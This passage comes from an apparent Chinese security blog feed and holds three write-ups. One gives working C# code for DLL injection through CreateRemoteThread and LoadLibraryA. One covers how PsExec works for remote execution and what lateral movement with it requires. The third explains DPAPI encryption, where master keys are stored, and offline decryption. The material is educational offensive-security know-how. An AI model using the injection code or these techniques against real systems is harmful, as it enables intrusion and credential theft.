：检索已由调用进程加载的指定模块的模块句柄。</li><li><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress" target="_blank" rel="noopener">GetProcAddress</a> ：从指定的动态链接库（DLL）中检索导出的函数或变量的地址。</li></ul><h3 id="5-4-示例代码"><a href="#5-4-示例代码" class="headerlink" title="5.4 示例代码"></a>5.4 示例代码</h3><p>DLL 注入，只需要在上面的基础上引入 <code>LoadLibrary</code> 即可。</p><p>代码部分只需要修改以下内容即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">public static void DLLInject(int pid, byte[] buf)</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        uint lpNumberOfBytesWritten = 0;</span><br><span class="line">        uint lpThreadId = 0;</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] 获取进程ID &#123;pid&#125; 的句柄.&quot;);</span><br><span class="line">        IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] 打开进程id &#123; pid &#125; 的句柄 &#123;pHandle&#125;.&quot;);</span><br><span class="line">        IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;);</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] LoadLibraryA 的导出函数地址是 &#123;loadLibraryAddr&#125; .&quot;);</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] 分配 DLL 路径的内存.&quot;);</span><br><span class="line">        IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] 注入 DLL 路径的内存分配在 0x&#123;rMemAddress&#125;.&quot;);</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] 在已分配的内存位置写入 DLL 路径.&quot;);</span><br><span class="line">        if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine($&quot;  [&gt;] DLL 路径写在目标进程内存中.&quot;);</span><br><span class="line">            Console.WriteLine($&quot;  [&gt;] 创建远程线程来注入 DLL.&quot;);</span><br><span class="line">            IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, loadLibraryAddr, rMemAddress, 0, ref lpThreadId);</span><br><span class="line">            bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread);</span><br><span class="line">            Console.WriteLine($&quot;[&gt;] 成功将 DLL 注入进程id &#123;pid&#125; 的内存中.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine($&quot;  [!] 无法将 DLL 注入进程id &#123;pid&#125; 的内存中.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        bool hOpenProcessClose = CloseHandle(pHandle);</span><br><span class="line">    &#125;</span><br><span class="line">    catch (Exception ex)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(&quot;[+] &quot; + Marshal.GetExceptionCode());</span><br><span class="line">        Console.WriteLine(ex.Message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x06-来源参考"><a href="#0x06-来源参考" class="headerlink" title="0x06 来源参考"></a>0x06 来源参考</h2><p><a href="https://3xpl01tc0d3r.blogspot.com/2019/08/process-injection-part-i.html" target="_blank" rel="noopener">https://3xpl01tc0d3r.blogspot.com/2019/08/process-injection-part-i.html</a></p><p><a href="https://pwnrip.com/demystifying-code-injection-techniques-part-1-shellcode-injection/" target="_blank" rel="noopener">https://pwnrip.com/demystifying-code-injection-techniques-part-1-shellcode-injection/</a></p><p><a href="https://blog.cobaltstrike.com/2019/08/21/cobalt-strikes-process-injection-the-details/" target="_blank" rel="noopener">https://blog.cobaltstrike.com/2019/08/21/cobalt-strikes-process-injection-the-details/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;通过 &lt;code&gt;CreateRemoteThread&lt;/code&gt; API 进行代码与 DLL 注入。&lt;/p&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="知识回顾" scheme="https://rcoil.me/tags/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE/"/>
    
  </entry>
  
  <entry>
    <title>【知识回顾】深入了解 PsExec</title>
    <link href="https://rcoil.me/2019/08/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%20PsExec/"/>
    <id>https://rcoil.me/2019/08/【知识回顾】深入了解 PsExec/</id>
    <published>2019-08-18T06:37:56.000Z</published>
    <updated>2019-10-31T15:41:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>这个<strong>[ 知识回顾 ]</strong>系列文章，整合记录的是在掌握知识点中，所忽略的点、涉及的原理等；</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这篇文章将解释 <code>PsExec</code> 的使用条件、原理及背景知识。但不包括 <code>PsExec</code> 在通信时主要用到了 <code>SMB</code> 这个应用层协议（ <code>SMB</code>协商过程），想了解的请看 参考-1-2。</p><h2 id="0x01-什么是-PsExec"><a href="#0x01-什么是-PsExec" class="headerlink" title="0x01 什么是 PsExec"></a>0x01 什么是 <code>PsExec</code></h2><p><code>PsExec</code> 是由 <code>Mark Russinovich</code> 创建的 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" target="_blank" rel="noopener">Sysinternals Suite</a> 中包含的工具。最初，它旨在作为系统管理员的便利工具，以便他们可以通过在远程主机上运行命令来执行维护任务。<code>PsExec</code> 可以算是一个轻量级的 telnet 替代工具，它使您无需手动安装客户端软件即可执行其他系统上的进程，并且可以获得与命令控制台几乎相同的实时交互性。PsExec最强大的功能就是在远程系统和远程支持工具（如 ipconfig、whoami）中启动交互式命令提示窗口，以便显示无法通过其他方式显示的有关远程系统的信息。</p><h2 id="0x02-工作原理"><a href="#0x02-工作原理" class="headerlink" title="0x02 工作原理"></a>0x02 工作原理</h2><p>通过提供目标主机的地址，有效用户和密码，就可以远程控制计算机。</p><p><img src="/image/【知识回顾】深入了解 PsExec/Snipaste_2019-08-08_10-45-55.png" alt=""></p><p>它的背后到底发生了些什么，我们来看看：</p><ul><li>将 <code>PSEXESVC.exe</code> 上传到 <code>ADMIN$</code> （指向 <code>/admin$/system32/PSEXESVC.EXE</code>）共享文件夹内；</li><li>远程创建用于运行 <code>PSEXESVC.exe</code> 的服务；</li><li>远程启动服务。</li></ul><p><code>PSEXESVC</code> 服务充当一个重定向器（包装器）。它在远程系统上运行指定的可执行文件（事例中的是 <code>cmd.exe</code>）。同时，它通过主机之间来重定向进程的输入/输出（利用命名管道）。</p><p><img src="/image/【知识回顾】深入了解 PsExec/blog_2019-08-09_09-39-29.png" alt=""></p><h2 id="0x03-详细过程"><a href="#0x03-详细过程" class="headerlink" title="0x03 详细过程"></a>0x03 详细过程</h2><ul><li>使用提供的凭证，通过 <code>SMB 会话</code> 进行身份验证。</li><li>通过 <code>SMB</code> 访问默认共享文件夹 <code>ADMIN$</code>，并上载 <code>PSEXESVC.exe</code>；</li><li><p><img src="/image/【知识回顾】深入了解 PsExec/Snipaste_2019-08-08_15-14-16.png" alt=""></p></li><li><p>打开 <code>\\RDC\pipe\svcctl</code> 的句柄，与<code>服务控制管理器（SCM）</code>进行通信，这使得我们能够远程创建/启动服务。此时使用的是 <code>SVCCTL</code> 服务，通过对 <code>SVCCTL服务</code> 的 <code>DCE/RPC</code> 调用来启动 <code>PsExec</code>;</p></li><li>使用上传的 <code>PSEXESVC.exe</code> 作为服务二进制文件，调用 <code>CreateService 函数</code>；</li><li>调用 <code>StartServices 函数</code>；</li><li><img src="/image/【知识回顾】深入了解 PsExec/Snipaste_2019-08-08_15-25-29.png" alt=""></li><li><p><img src="/image/【知识回顾】深入了解 PsExec/Snipaste_2019-08-08_15-28-25.png" alt=""></p></li><li><p>正如下面的 <code>Wireshark</code> 所捕获到的数据，它是创建了命名管道来重定向 stdin（输入）、stdout（输出）、stderr（输出）。</p></li><li><img src="/image/【知识回顾】深入了解 PsExec/Snipaste_2019-08-08_15-33-49.png" alt=""></li></ul><p>总共创建了4个命名管道，一个用于服务本身，另外的管道用于重定向进程的 stdin、stdout、stderr。</p><p><img src="/image/【知识回顾】深入了解 PsExec/Snipaste_2019-08-08_15-47-34.png" alt=""></p><h2 id="0x04-使用-PsExec-的最低要求"><a href="#0x04-使用-PsExec-的最低要求" class="headerlink" title="0x04 使用 PsExec 的最低要求"></a>0x04 使用 PsExec 的最低要求</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、远程机器的 <span class="number">139</span> 或 <span class="number">445</span> 端口需要开启状态，即 SMB；</span><br><span class="line"><span class="number">2</span>、明文密码或者 NTLM 哈希；</span><br><span class="line"><span class="number">3</span>、具备将文件写入共享文件夹的权限；</span><br><span class="line"><span class="number">4</span>、能够在远程机器上创建服务：SC_MANAGER_CREATE_SERVICE (访问掩码：<span class="number">0x0002</span>)；</span><br><span class="line"><span class="number">5</span>、能够启动所创建的服务：SERVICE_QUERY_STATUS（访问掩码：<span class="number">0x0004</span>）+ SERVICE_START（访问掩码：<span class="number">0x0010</span>）</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">NTLM != NTLM v1/v2 ；</span><br><span class="line">NTFS 权限 != 共享权限；</span><br><span class="line">如果使用的是 Sysinternal 的 PsExec，它是会将 PSEXESVC.exe 复制到 ADMIN$，因此是具备访问它的权限；</span><br><span class="line">PSEXESVC 服务将会安装在远程系统中，此时将会生成 Event <span class="number">4697</span>、<span class="number">7045</span> 这<span class="number">2</span>种事件日志；</span><br><span class="line">PsExec <span class="number">2.1</span>版本之后，不再是明文传输。</span><br></pre></td></tr></table></figure><p>在多数情况下，即使账号出现泄漏情况，使用 <code>PsExec</code>， 也无法完成第4和第5点的要求，因为账号不是特权账号（RID500、域管理员）。</p><h2 id="0x05-其他"><a href="#0x05-其他" class="headerlink" title="0x05 其他"></a>0x05 其他</h2><p>日志分析：略</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p>1、<a href="https://bbs.pediy.com/thread-223721.htm" target="_blank" rel="noopener">[翻译] 网络安全分析之 SMB 协议</a></p><p>2、<a href="http://zone.secbug.net/content/2230.html" target="_blank" rel="noopener">[使用Hash直接登录Windows]简单分析</a></p><p>3、<a href="https://www.anquanke.com/post/id/84921" target="_blank" rel="noopener">[技术分享] 深入分析PsExec执行行为</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个&lt;strong&gt;[ 知识回顾 ]&lt;/strong&gt;系列文章，整合记录的是在掌握知识点中，所忽略的点、涉及的原理等；&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="系统安全" scheme="https://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
      <category term="知识回顾" scheme="https://rcoil.me/tags/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE/"/>
    
  </entry>
  
  <entry>
    <title>【知识回顾】DPAPI 详解</title>
    <link href="https://rcoil.me/2019/07/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91DPAPI%20%E8%AF%A6%E8%A7%A3/"/>
    <id>https://rcoil.me/2019/07/【知识回顾】DPAPI 详解/</id>
    <published>2019-07-06T13:29:11.000Z</published>
    <updated>2019-10-31T15:42:32.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>摘要：</strong>数据保护接口是微软从 Windows 2000 开始引入的一种简易程序接口，主要为应用程序和操作系统程序提供高强度的数据加密和解密服务。Windows 系统用户大量的私密数据都采用了 DPAPI 进行加密存储。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>​        绝大多数应用程序都有数据加密保护的需求，存储和保护私密信息最安全的方式就是每次需要加密或解密时都从用户那里得到密码，使用后再丢弃。这种方式每次处理信息时都需要用户输入口令，对于绝大多数用户来说，这种方式是不可取的。因为这要求用户记住很多信息，而用户一般会反复使用同一个密码，从而降低系统的安全性和可用性。因此需要一种加密机制，再不需要用户输入任何信息的情况下也能存储秘密数据，而微软数据保护接口（<code>Data Protection Application Programming Interface</code>，DPAPI）便是瞒住这种要求的程序接口。</p><p>​        从 Windows 2000 开始，用户程序或操作系统程序就可以直接调用 DPAPI 来加密数据。由于 DPAPI 简单易用且加密强大，大量应用程序都采用 DPAPI 加密用户的私密数据，如 <code>Chrome 浏览器</code>的自动登陆密码、<code>远程桌面</code>的自动登陆密码、<code>Outlook邮箱</code>的账号密码、<code>加密文件系统</code>的私钥等。DPAPI 内部加密流程异常复杂而且微软官方也未公布过其内部细节，这给理解该接口内部实现机制带来了极大困难。本文在已有的研究基础上对 DPAPI加密机制做了全面剖析，给出了DPAPI的离线解密方法。</p><h2 id="0x01-DPAPI-概述"><a href="#0x01-DPAPI-概述" class="headerlink" title="0x01 DPAPI 概述"></a>0x01 DPAPI 概述</h2><h3 id="1-1-DPAPI-函数"><a href="#1-1-DPAPI-函数" class="headerlink" title="1.1 DPAPI 函数"></a>1.1 DPAPI 函数</h3><p>​        DPAPI 由一个加密函数（<code>CryptProtectData()</code>）和一个解密函数（<code>CryptUnProtectData()</code>）组成，是一组跟Windows 系统用户环境上下文密切相关的数据保护接口。某个系统用户调用 <code>CryptProtectData()</code> 加密后的数据只能由同一系统用户调用 <code>CryptUnProtectData()</code> 来解密，一个系统用户无法调用 <code>CryptUnProtectData()</code> 来解密其他系统用户的 <code>DPAPI</code> 加密数据。</p><ul><li><p><code>CryptProtectData()</code> 的函数调用</p><p>  <img src="/image/【知识回顾】DPAPI 详解/CryptProtectData.png" alt=""></p>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">pDataIn：DATA_BLOB</span> <span class="string">结构指针，只想需要加密的数据明文块；</span></span><br><span class="line"><span class="string">szDataDescr：描述字符串，返回的数据包含该字符串，其未被加密。该参数为可选参数，可以为</span> <span class="literal">NULL</span><span class="string">；</span></span><br><span class="line"><span class="string">pOptionslEntropy：DATA_BLOB</span> <span class="string">结构指针，指向一个额外熵参数，可以是一个加密密码。改参数为可选参数乜可以为</span> <span class="literal">NULL</span><span class="string">。若加密时设置了额外熵参数，则加密时必须提供同样的熵参数，否则无法解密；</span></span><br><span class="line"><span class="string">pvReserved：保留，必须为</span> <span class="literal">NULL</span><span class="string">；</span></span><br><span class="line"><span class="string">pPromptStruct：CRYPTPROTECTPROMPTSTRUCT</span> <span class="string">结构指针，用于弹出对话框与用户交互，通常为</span> <span class="literal">NULL</span><span class="string">。</span></span><br><span class="line"><span class="string">dwFlags：加密标识位，通常为</span> <span class="literal">NULL</span><span class="string">；</span></span><br><span class="line"><span class="string">pDataOut：DATA_BLOB</span> <span class="string">结构指针，只想经过加密处理后的密文块。</span></span><br></pre></td></tr></table></figure></li><li><p><code>CryptUnProtectData()</code> 的参数跟 <code>CryptProtectData()</code> 的参数类似，详见 <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa380882(v=vs.85" target="_blank" rel="noopener">MSDN 文档</a>.aspx)，这里不在说明。</p></li></ul><h3 id="1-2-基本概念介绍"><a href="#1-2-基本概念介绍" class="headerlink" title="1.2 基本概念介绍"></a>1.2 基本概念介绍</h3><p><strong>1）加密应用程序编程接口</strong></p><p>​        加密应用程序编程接口（ cryptography application programming interface, CryptoAPI ）是 Windows 平台提供的一组函数，该函数允许应用程序对用户的秘密信息进行编码、加密和数字签证等操作。<code>CryptoAPI</code> 内部的加密操作是在加密服务提供程序（CSP）的独立模块中执行，<strong>DPAPI 是在 CryptoAPI 的基础上实现封装</strong>。</p><p><strong>2）加密服务提供程序</strong></p><p>​        加密服务提供程序（ cryptographic service provider，CSP ）是一组实现标准加密和签名算法的硬件和软件的组合。每个 CSP 都包含一组它们自己定义并实现的函数。不同的 CSP 提供的安全算法不用，且 CSP 是平台相关的。不同的 Windows 操作系统提供的 CSP 的个数和类型也不同，每个 CSP 都有其对应的名称和类型，名称必须是唯一的。目前常用的 CSP 类型有9种，要指定采用哪种 CSP，只需在 <a href="https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptacquirecontexta" target="_blank" rel="noopener">CryptAcquirecContext()</a> 中指定即可，DPAPI 默认使用 <code>PROV_RSA_FULL</code> 类型。</p><p><strong>3）算法标识</strong></p><p>​        算法标识（ ALG_ID ）是微软顶一顶一系列 32 位整型值，用于指明 <code>CryptoAPI</code> 所采用的加密或散列算法类型。其中以 <code>0x66</code> 开头的标识通常表示对称加密算法，以 <code>0x88</code> 开头的标识通常表示散列算法。例如，<code>CALG_3DES</code> 对应的值为 <code>0x6603</code> ，表示为三重数据加密标准。</p><p><strong>4）安全散列算法</strong></p><p>​        安全散列算法（ secure hash algorithm，SHA ）是散列算法中的一种，又叫摘要算法，用于产生消息摘要，也是经常使用的一种算法。在数据签名标准（ digita signature standard，DSS ）中，安全散列算法通常和数字签名算法（ digital signature algorithm，DSA ）一起用于对消息进行数字签名。每一个安全散列算法都有其对应的算法标识。在 <code>CryptoAPI</code> 中，SHA 对应的算法标识为 <code>CALG_SHA</code> 。目前，安全散列算法有 4 种：SHA-1、SHA-256、SHA-384 和 SHA-512，可分别产生 160 位、256 位、384 位和 512 位长的消息摘要，还有一个变种的SHA-224（224位）实现方为 Bouncy Castle。</p><p><strong>5）会话密钥</strong></p><p>​        会话密钥（ session key ）是随机产生的密钥，使用一次后，立刻被丢弃而不会被保存。在 <code>CryptoAPI</code> 中，会话密钥通常是对称加密算法的密钥。会话密钥由 40～2000 位随机数组成，可以通过调用 CryptoAPI 中的 <a href="https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptderivekey" target="_blank" rel="noopener">CryptDeriveKey()</a> 并传递一个散列值来生成。</p><p><strong>6）干扰值</strong></p><p>​        干扰值（ salt valve ）也称作 “盐”，通常是随机数，一般可看作是会话密钥的一部分。干扰值被添加到会话密钥后，通常是以明文的形式被防止在加密数据的前端。加入干扰值可以有效地防止堆成加密算法被预先计算好的彩虹表攻击。在 <code>CryptoAPI</code> 中，干扰值通过 <a href="https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptgenrandom" target="_blank" rel="noopener">CryptGenRandom()</a> 来生成，此函数在将来的版本会进行删除，详情请看函数详情。</p><p><strong>7）基于口令的密钥派生函数</strong></p><p>​        基于口令的密钥派生函数（ passwordbased key derivation function，PBKDF ）通过对干扰后的用户输入口令计算多次散列来缓和字典攻击。攻击者若想确定口令的正确性，需要执行上百万条指令，导致完成一次字典攻击就需要花费大量时间。PBKDF 目前有两个版本：PBKDF1 和 PBKDF2，两个函数均以口令、干扰值和内部函数的跌代次数作为输入。在 DPAPI 中，采用的是 PBKDF2 版本，且内部做了部分改动。</p><p><strong>8）加密散列函数</strong></p><p>​        加密散列函数又叫基于散列的消息认证代码（ hash-based message authentication code，HMAC ）。使用加密散列函数需要一个密钥，同时还需要制定一个散列函数，可以是 MD5 或 SHA-1 等。在 DPAPI 中，HMAC 主要用于数据认证。</p><p><strong>9）密钥分组链接</strong></p><p>​        密钥分组链接（ cipher-block chaining，CBC ）是一种加密模式，在 CBC 模式中，每个分组完的明文块都需要与前一个经过加密后的密文块进行异或操作，然后进行加密操作。因此需要使用初始化向量。 CBC 加密模块是微软默认使用的加密模块，DPAPI 内部对所有对称加密算法默认都采用 CBC 加密模式。</p><p><strong>10）填充</strong></p><p>​        填充( padding) 是明文根据加密函数进行数据分组后，<em>由于最后一个明文块不满足分组数据长度要求而在末尾额外添加的数据</em>。填充的数据解密后一般会被自动移除，DPAPI 内部所有堆成加密算法默认都采用 <code>PKCS</code> 填充方式。</p><h2 id="0x02-DPAPI-加密机制分析"><a href="#0x02-DPAPI-加密机制分析" class="headerlink" title="0x02 DPAPI 加密机制分析"></a>0x02 DPAPI 加密机制分析</h2><p>​        <code>CryptProtectData()</code> 是对 <code>CryptoAPI</code> 的封装，其加密过程如下图所示。</p><p><img src="/image/【知识回顾】DPAPI 详解/DPAPI 加密过程.png" alt=""></p><p><center>图1 DPAPI 加密过程</center><br>​        整个加密过程大致可以分成 3 个阶段，分别为<strong>生成主密钥</strong>、<strong>解密主密钥</strong>以及<strong>使用主密钥加密数据</strong>。</p><h3 id="2-1-生成主密钥"><a href="#2-1-生成主密钥" class="headerlink" title="2.1 生成主密钥"></a>2.1 生成主密钥</h3><p>​        当前应用程序调用 <code>CryptProtectData()</code> 时，DPAPI 会读取主密钥存储区下的 <code>Preferred</code> 文件，获取当前系统使用的主密钥文件及其创建时间，如果创建时间与当前系统时间相差超过了 90 天，则重新生成一个主密钥文件。</p><p>​        为了防止攻击者对同一个加密主密钥进行长期的攻击，微软引入了主密钥的更新机制，更新时间微软设置为 90 天。即若 <code>Preferred</code> 文件中指示的主密钥创建时间与系统当前时间<strong>相差 90 天</strong>以上，将生成一个新的主密钥，新的主密钥将以同样的加密方式保护用户数据。这种主密钥更新策略有效防止了攻击者破解唯一的主密钥后即可访问用户所有的受保护数据。因为主密钥会更新，因而 DPAPI 必须提供一种机制能够解密历史主密钥加密下的数据库。其实，DPAPI 不删除任何过期的主密钥，所有的主密钥文件保存在用户的配置文件目录下，且全受到用户登陆密码的保护，并且每一个加密块都存储着当时加密它的主密钥全局唯一标识符（GUID）。当需要解密加密块时，DPAPI 从加密块中提取 GUID，找到对应主密钥文件进行相应的数据解密。</p><h3 id="2-2-解密主密钥"><a href="#2-2-解密主密钥" class="headerlink" title="2.2 解密主密钥"></a>2.2 解密主密钥</h3><p>​        若 <code>Preferred</code> 文件指示的主密钥没有过期，DPAPI 将解密对应的主密钥文件，获取 64 字节的主密钥。</p><p>​        主密钥受到用户登陆密码保护。DPAPI 首先使用 SHA-1 安全散列函数作用于用户登陆密码，然后将此密码散列和 16 字节的干扰值以跌代次数提供给基于口令的密钥派生函数 PBKDF2，用户派生一个会话密钥；然后用此会话密钥作为堆成加密算法的加密密钥，对主密钥进行加密，将加密后的主密钥存储在用户的配置文件目录下。</p><p>​        为了防止主密钥被篡改，主密钥将被计算 HMAC 加密散列。DPAPI 将使用 SHA 版HMAC 加密散列算法并以密码散列作为加密密钥作用于 16 字节干扰值，进而派生对应加密 散列值。该加密散列值再次作为 HMAC 的密钥计算主密钥的加密散列，计算后的加密散列同加密后的主密钥一起存于主密钥中。</p><p>​        由于主密钥受到用户登陆密码的保护，而用户登陆密码又是可修改的。因此，DPAPI 必须提供一种机制，使得在用户修改登陆密码后仍然可以正常解密主密钥。其实，DPAPI 对密码修改模块进行了 Hook 操作。当用户修改密码时，所有主密钥都将根据新的密码重新加密。另外，用户配置文件目录下有个历史凭据文件 <code>CREDHIST</code>，当用户修改密码时，旧密码的 SHA-1 散列值会用新的密码进行加密，然后将加密后的结果存放在文件的底部。因此，如果当前系统登录密码法务解密主密钥，DPAPI 将使用当前密码解密历史凭据文件，获取上一次历史密码散列值，然后用这个历史密码散列值解密主密钥。如果解密又失败了，历史密码散列值将再次用于解密历史凭据文件，获取更旧的密码散列值。如此下去，直到成功解密主密钥为止。</p><h3 id="2-3-使用主密钥加密数据"><a href="#2-3-使用主密钥加密数据" class="headerlink" title="2.3 使用主密钥加密数据"></a>2.3 使用主密钥加密数据</h3><p>​        主密钥并不直接作为加密密钥来保护数据。DPAPI 首先将主密钥、16 字节干扰值以及应用程序提供的额外熵参数 3者组合派生一个会话密钥，然后用这个会话密钥对数据进行加密。但这个会话密钥永远不会被保存，DPAPI 选择存储用于派生会话密钥的 16 字节干扰值。这些干扰值是用来产生加密数据的关键。当 DPAPI 需要解密加密块时，便从加密块种提取这 16 字节的干扰值，并以同加密相同的方式派生出会话密钥，然后用该会话密钥对数据进行解密。</p><h2 id="0x03-DPAPI-离线解密方法"><a href="#0x03-DPAPI-离线解密方法" class="headerlink" title="0x03 DPAPI 离线解密方法"></a>0x03 DPAPI 离线解密方法</h2><p>由以上对 DPAPI 加密过程的分析容易得出 DPAPI 离线解密过程，如下图所示。</p><p><img src="/image/【知识回顾】DPAPI 详解/DPAPI 离线解密过程.png" alt=""></p><p><center>图2 DPAPI 离线解密过程</center><br>​        DPAPI 离线解密过程大致可以分为以下几点。</p><h3 id="3-1-定位主密钥"><a href="#3-1-定位主密钥" class="headerlink" title="3.1 定位主密钥"></a>3.1 定位主密钥</h3><p>​        由对 DPAPI 加密过程的分析可知主密钥文件会定期更新，Preferred 文件中存储这最后生成的主密钥文件 GUID，然而任意给定的一个 DPAPI 加密块并不一定时用最新的主密钥进行解密。为了快速定位 DPAPI加密块对应的主密钥文件，DPAPI 加密块种存储当时加密它的主密钥 GUID。DPAPI 加密块大致结构如下图所示。</p><p><img src="/image/【知识回顾】DPAPI 详解/定位主密钥.png" alt=""></p><p><center>图3 DPAPI 加密块结构</center><br>​        从 DPAPI 加密块结构可知其除了存储主密钥 GUID 外，还存储解密时所需的其他关键数据信息，包括所使用的对称加密算法标识、安全散列算法标识、干扰值等。</p><ul><li>第一个字段表示版本号，为固定值 0x00000001；</li><li><p>第二个字段表示加密服务提供程序的 DUID，也为固定值 D08C9DDF0115D1118C7A00C04FC297EB；</p><p>​    由于标准的 DPAPI 加密块总是以单个完整的文件存在，所以标准的 DPAPI 加密块有可能包含在文件中作为文件的一部分存在，甚至有些文件可以包含多个标准的 DPAPI 加密块。由于 DPAPI 加密块的前两个字段总是为固定值，因此可以以此为特征在文件中搜索和提取标准的 DPAPI 加密块。</p></li></ul><h3 id="3-2-解密主密钥"><a href="#3-2-解密主密钥" class="headerlink" title="3.2 解密主密钥"></a>3.2 解密主密钥</h3><p>​        Windows 的主密钥文件和历史凭据文件有其固定的路径结构，如下所示。</p><ul><li>用户主密钥文件，位于<code>％APPDATA％\Microsoft\Protect\％SID％</code></li><li><p>系统主密钥文件，位于<code>％WINDIR％\System32\Microsoft\Protect\S-1-5-18\User</code></p><p>​    每个系统帐号都有其对应的若干个主密钥；%SID% 是 Windows系统为区分不同账户而为它们分配的全局唯一标识符，它们的格式的固定的。和主密钥对应的历史凭据文件则位于主密钥的上一层目录。</p><p>​    主密钥文件共包含 5 个数据单元，分别为<code>主密钥头部单元</code>、<code>用户主密钥单元</code>、<code>本地加密密钥单元</code>、<code>历史凭据标识单元</code>和<code>域密钥备份单元</code>。结构如图所示。</p></li></ul><p><img src="/image/【知识回顾】DPAPI 详解/主密钥文件结构.png" alt=""></p><p><center>图4 主密钥文件结构</center><br>​        其中，主密钥头部单元包括主密钥 GUID，该标识与 DPAPI 中指示的加密密钥唯一标识相对应。另外，主密钥头部单元还包含了指示其他个单元占用字节数的字段。历史凭据单元也包含一个全局唯一表示符（ CREDHIST GUID ），用来指示跟主密钥文件对应的历史凭据文件。对于域密钥本分单元，只有域环境下的用户才会有，此单元的数据经过了域管理员的公钥加密处理。对于单机用户，无论什么系统都没有域密钥备份单元，这篇文章主要解析单机用户主密钥单元。用户主密钥单元包含一个经过加密的二进制加密块，其中的加密数据就是主密钥。</p><p>​        用户主密钥单元中包含 PBKDF2 采用的迭代次数、安全散列算法类型和对称加密算法类型等字段，不同的操作系统有着不同的值</p><table><thead><tr><th style="text-align:center">操作系统</th><th style="text-align:center">PBKDF2迭代次数</th><th style="text-align:center">安全散列算法类型</th><th style="text-align:center">加密算法类型</th></tr></thead><tbody><tr><td style="text-align:center">Windows XP</td><td style="text-align:center">4000</td><td style="text-align:center">SHA-1</td><td style="text-align:center">DES-3</td></tr><tr><td style="text-align:center">Windows 2003</td><td style="text-align:center">4000</td><td 